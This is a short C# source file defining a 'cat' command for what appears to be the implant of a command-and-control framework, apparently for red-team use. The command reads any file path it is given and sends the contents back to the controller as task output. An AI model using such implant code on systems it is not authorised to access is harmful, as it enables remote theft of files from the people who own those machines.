using System.IO;

using Drone.Models;

namespace Drone.Functions;

public class ReadFile : DroneFunction
{
    public override string Name => "cat";
    
    public override void Execute(DroneTask task)
    {
        var text = File.ReadAllText(task.Parameters[0]);
        Drone.SendOutput(task.TaskId, text);
    }
}